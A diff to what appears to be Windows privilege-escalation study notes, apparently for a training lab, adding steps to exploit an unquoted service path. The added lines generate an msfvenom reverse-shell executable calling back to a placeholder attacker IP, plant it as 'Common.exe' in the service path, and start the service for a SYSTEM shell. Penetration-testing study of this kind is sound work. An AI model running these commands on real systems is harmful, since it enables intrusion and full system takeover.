@@ -60,6 +60,18 @@ C:\> sc qc unquotedsvc
 ```batch
 C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
 ```
+### Generate a Reverse shell using msfvenom
+```batch
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attackerIP> LPORT=<port>  -f exe -o reverse.exe
+```
+### Copy the reverse.exe executable you created to this directory and rename it Common.exe:
+```batch
+copy C:\Users\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+```
+### Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
+```batch
+net start unquotedsvc
+```
 
 ## Services
 
